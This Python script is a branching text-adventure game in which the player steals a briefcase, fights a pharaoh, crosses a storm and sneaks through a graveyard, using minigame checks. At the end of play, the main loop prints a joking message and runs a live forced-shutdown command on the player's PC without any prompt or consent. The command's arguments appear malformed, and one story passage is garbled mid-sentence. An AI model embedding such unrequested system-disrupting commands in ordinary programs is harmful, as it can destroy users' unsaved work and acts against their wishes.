import os
import modules_new
from minigame import pharaoh_battle, storm_navigation , obstacle_navigation

class DirectStart(modules_new.Start):
    def __init__(self):
        super().__init__()
    
    def action(self, state_enum):
        print("Story is beginning now.")
        # Premise of the story

path = [
    DirectStart(),
    #beginning of Story II
    modules_new.OptionPicker(
        [
            modules_new.Option(lambda: None, "1. Steal your neighbor’s car and drive to the airport. " ),
            modules_new.Option(lambda: None, "2. Take the bus to the airport .  ")
        ],
    ),
    modules_new.OptionPicker(
        [
            modules_new.Option(lambda: None, "1. Steal the briefcase while they're distracted"),
            modules_new.Option(lambda: None, "2. Ask the men for a cut of the money in exchange for labor")
        ]

    ),
    modules_new.Checkpoint("Placeholder","After stealing the briefcase and making your way, you believe you are home free. \
         But wait! Who is that formulating in that massive sand storm? Low and behold, it is THE MIGHTY PHARAOH and he wants to take your money AND your life! \
        This dude has 500 HEALTH and you have 200, so beating him won't be easy", lambda: modules_new.game_continue.FORWARD if pharaoh_battle() else modules_new.game_continue.CHECKPOINT
        ),

     modules_new.OptionPicker(
        [
            modules_new.Option(lambda: None, "1. Board the smuggler's boat at midnight"),
            modules_new.Option(lambda: None, "2. Hide in a shipping crate heading to Cádiz"),
        ]

    ),
    modules_new.Checkpoint("Placeholder", "You're on the ship, and suddenly a storm comes and takes you and the passengers aboard. \
         The waves are dangerous, and are smashing against your vessel. Navigate through the storm to survive! \
        ", lambda: modules_new.game_continue.FORWARD if storm_navigation() else modules_new.game_continue.CHECKPOINT
        ),

    modules_new.OptionPicker(
        [
            modules_new.Option(lambda: None, "1. Take the flight and deliver the case as instructed"),
            modules_new.Option(lambda: None, "2. Open the briefcase during the flight"),
        ],
    ),

    modules_new.Checkpoint("Placeholder", "On the plane, terrorists with AR-15s and rocker launchers \
        Conveniently though, there has been a veteran who was buried recently with all of his possessions, including his empty passport. \
        One issue tho, b/c he was a high ranking general, his gravesite is guarded 24/7 and you must make your way across the graveyard. \
        ", lambda: modules_new.game_continue.FORWARD if obstacle_navigation() else modules_new.game_continue.CHECKPOINT)
    #End of story II

]
direct = modules_new.Story(path)
while True:
    x = direct.game_state()
    if x == "End":
        print("Thank you for playing. You probably sat here a long time to finish this game. So, i'm shutting down your PC as a good-will. GO WALK OUTSIDE!!!")
        os.system('shutdown /s /t /f 0')